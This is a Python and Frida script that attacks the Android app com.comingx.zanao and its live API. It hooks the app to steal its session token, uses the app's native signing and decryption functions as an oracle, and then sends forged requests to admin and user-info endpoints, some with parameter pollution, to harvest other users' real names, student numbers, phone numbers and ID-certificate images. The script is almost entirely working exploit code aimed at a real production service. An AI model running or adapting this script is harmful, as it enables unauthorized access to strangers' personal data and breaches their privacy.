#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
probe.py — 用本机 App 的会话 + native 签名 oracle，验证「能否拿到他人 PII」

流程:
  1. spawn com.comingx.zanao，装一个脚本: 抓 App 自身请求(取 token/alias) + 暴露 makeSign/unhashAppResult
  2. 走 /thread/v2/list 拿别人 uid/nickname/headimgurl
  3. /mx/user/usershow {uid}   -> 他人画像
  4. /mx/admin/userinfo {uid}  -> 越权面
  5. /thread/admin/userinfo {uid}
  6. /user/certinfo 参数污染
"""
import json
import os
import random
import re
import string
import sys
import time

import frida
import requests

HOST = '127.0.0.1:39999'
PKG = 'com.comingx.zanao'
BASE = 'https://api.app.zanao.com'
OUT = os.path.dirname(os.path.abspath(__file__))

FRIDA_SRC = r'''
var JniUtils = null, TMap = null;
function waitJava(t) {
  if (typeof Java !== 'undefined') { try { Java.perform(init); } catch (e) { send({t:'err',m:''+e}); } return; }
  if (t <= 0) { send({t:'err',m:'no java'}); return; }
  setTimeout(function(){ waitJava(t-1); }, 200);
}
function init() {
  try { JniUtils = Java.use('com.comingx.zanao.utils.JniUtils'); TMap = Java.use('java.util.TreeMap'); } catch(e) { send({t:'err',m:'use:'+e}); }
  try {
    var N = Java.use('com.comingx.zanao.JSIs.NetworkJSI');
    ['request','easyRequest'].forEach(function(n){
      if (!N[n]) return;
      N[n].overloads.forEach(function(ov){
        if (ov.argumentTypes.length !== 1 || ov.argumentTypes[0].className !== 'java.lang.String') return;
        ov.implementation = function(s){
          try { if (s && s.indexOf('X-Sc-Token') >= 0 && !globalThis.__got) { globalThis.__got = true; send({t:'req', body:String(s)}); } } catch(e){}
          return ov.call(this, s);
        };
      });
    });
    send({t:'hooked'});
  } catch(e) { send({t:'err',m:'hook:'+e}); }
  rpc.exports = {
    sign: function(fields){
      var m = TMap.$new();
      for (var k in fields) m.put(String(k), String(fields[k]));
      return JniUtils.makeSign(m);
    },
    unhashApp: function(s){ return JniUtils.unhashAppResult(s); }
  };
}
waitJava(200);
'''


def rand_num(n=20):
    return ''.join(random.choice(string.digits) for _ in range(n))


def dig(obj, keys, path=''):
    out = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in keys and not isinstance(v, (dict, list)):
                out[path + '.' + k] = v
            out.update(dig(v, keys, path + '.' + k))
    elif isinstance(obj, list):
        for i, v in enumerate(obj[:3]):
            out.update(dig(v, keys, path + '[%d]' % i))
    return out


INTEREST = {'uid', 'user_id', 'nickname', 'headimgurl', 'realname', 'student_no',
            'cert_img', 'cert_img_url', 'cert_valid', 'school_id', 'reg_days',
            'degree_text', 'college_text', 'join_year', 'phone', 'is_forbid', 'errno'}


class C:
    def __init__(self, script, token, alias, device):
        self.o = script
        self.token, self.alias, self.device = token, alias, device
        self.s = requests.Session()

    def call(self, pathname, url, data=None, method='POST', timeout=20):
        data = data or {}
        nd, td = rand_num(20), str(int(time.time()))
        si = {'timestamp__': td, 'randnum__': nd}
        si.update({k: v for k, v in data.items()})
        ah = self.o.exports_sync.sign(si)
        h = {
            'X-Sc-Alias': self.alias, 'X-Sc-Token': self.token, 'X-Sc-Client': 'app',
            'X-Sc-Device': self.device, 'X-Sc-Platform': 'Android', 'X-Sc-Hb-V': '210',
            'X-Sc-Nt-V': '310', 'X-Sc-Version': '3.1.0', 'X-Sc-Nd': nd, 'X-Sc-Td': td,
            'X-Sc-Ah': ah, 'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'okhttp/4.9.3',
        }
        full = BASE + pathname + url
        if method == 'GET':
            r = self.s.get(full, params=data, headers=h, timeout=timeout)
        else:
            r = self.s.post(full, data=json.dumps(data, ensure_ascii=False),
                            headers=h, timeout=timeout)
        raw = r.text
        if r.headers.get('X-Data-Encrypt') == '1' or r.headers.get('x-sc-encrypt') == '1':
            raw = self.o.exports_sync.unhash_app(raw)
        try:
            j = json.loads(raw)
        except Exception:
            return {'_status': r.status_code, '_raw': raw[:1500]}
        if isinstance(j, dict) and j.get('__encrypt__') and j.get('__data__'):
            try:
                j = json.loads(self.o.exports_sync.unhash_app(j['__data__']))
            except Exception as e:
                j['_decerr'] = str(e)
        j['_status'] = r.status_code
        return j


def main():
    dev = frida.get_device_manager().add_remote_device(HOST)
    try:
        dev.kill(PKG)
    except Exception:
        pass
    time.sleep(1)
    pid = dev.spawn([PKG])
    session = dev.attach(pid)
    state = {}

    def on_msg(m, d):
        if m.get('type') != 'send':
            print('[frida]', m); return
        p = m['payload']
        if p.get('t') == 'req':
            state['body'] = p['body']
            print('[+] captured real request (%d bytes)' % len(p['body']))
        elif p.get('t') in ('err',):
            print('[frida-err]', p)

    script = session.create_script(FRIDA_SRC)
    script.on('message', on_msg)
    script.load()
    dev.resume(pid)

    for _ in range(60):
        if 'body' in state:
            break
        time.sleep(0.5)
    if 'body' not in state:
        print('[-] 未抓到 token（App 未登录？）'); return

    body = state['body']
    open(os.path.join(OUT, 'payload_sample.txt'), 'w', encoding='utf-8').write(body)
    token = re.search(r'X-Sc-Token\\?"\s*:\s*\\?"([^"\\]+)', body).group(1)
    alias = re.search(r'X-Sc-Alias\\?"\s*:\s*\\?"([^"\\]+)', body).group(1)
    device = re.search(r'X-Sc-Device\\?"\s*:\s*\\?"([^"\\]+)', body).group(1)
    print('[+] token=%s... alias=%s device=%s' % (token[:12], alias, device[:18]))

    token = requests.utils.unquote(token)
    c = C(script, token, alias, device)

    # 1. 帖子列表 -> 别人的 uid/nickname/headimgurl
    j = c.call('/sc-api', '/thread/v2/list', {'page': '1', 'per_page': '10'})
    print('\n=== 1) POST /sc-api/thread/v2/list  status=%s errno=%s' % (j.get('_status'), j.get('errno')))
    lst = (j.get('data') or {}).get('list') if isinstance(j.get('data'), dict) else j.get('list')
    if not lst:
        lst = j.get('list') or (j.get('data') or {}).get('thread_list') or []
    print('  list len =', len(lst))
    if lst:
        t0 = lst[0]
        print('  keys:', list(t0.keys())[:25])
        print('  first:', json.dumps({k: t0.get(k) for k in
              ('uid', 'user_id', 'nickname', 'headimgurl', 'is_anon') if k in t0},
              ensure_ascii=False))
        peers = [x for x in lst if x.get('uid') and not x.get('is_anon')][:3]
        print('  peers:', [(x.get('uid'), x.get('nickname'), (x.get('headimgurl') or '')[:60]) for x in peers])

    # 2. 逐个探
    target = None
    for x in lst:
        if x.get('uid'):
            target = str(x['uid']); break
    if not target:
        print('[-] 列表里没有 uid，停止'); return
    print('\n[TARGET uid=%s]' % target)

    tid = str((lst[0].get('thread_id') or lst[0].get('id')) if lst else '')
    probes = [
        ('2) POST /mx/user/usershow {uid}', '/mx/user/usershow', {'uid': target}),
        ('3) POST /mx/admin/userinfo {uid}', '/mx/admin/userinfo', {'uid': target}),
        ('4) POST /thread/admin/userinfo {uid}', '/thread/admin/userinfo', {'uid': target}),
    ]
    if tid:
        probes.append(('5) POST /user/usershow {thread_id}', '/user/usershow', {'thread_id': tid}))
    probes.append(('6) GET /user/certinfo?school_id=1&uid=TARGET', None, {'school_id': '1', 'uid': target}))

    for i, (title, path, data) in enumerate(probes):
        try:
            if path is None:
                j = c.call('/sc-api', '/user/certinfo', data, method='GET')
            else:
                j = c.call('/sc-api', path, data, method='POST')
        except Exception as e:
            print('\n=== %s -> EXC %s' % (title, e)); continue
        got = dig(j, INTEREST)
        print('\n=== %s status=%s errno=%s' % (title, j.get('_status'), j.get('errno')))
        print('   ', json.dumps(got, ensure_ascii=False)[:1500])
        open(os.path.join(OUT, 'resp_%d.json' % i), 'w', encoding='utf-8').write(
            json.dumps(j, ensure_ascii=False, indent=2)[:30000])

    try:
        dev.kill(PKG)
    except Exception:
        pass


if __name__ == '__main__':
    main()
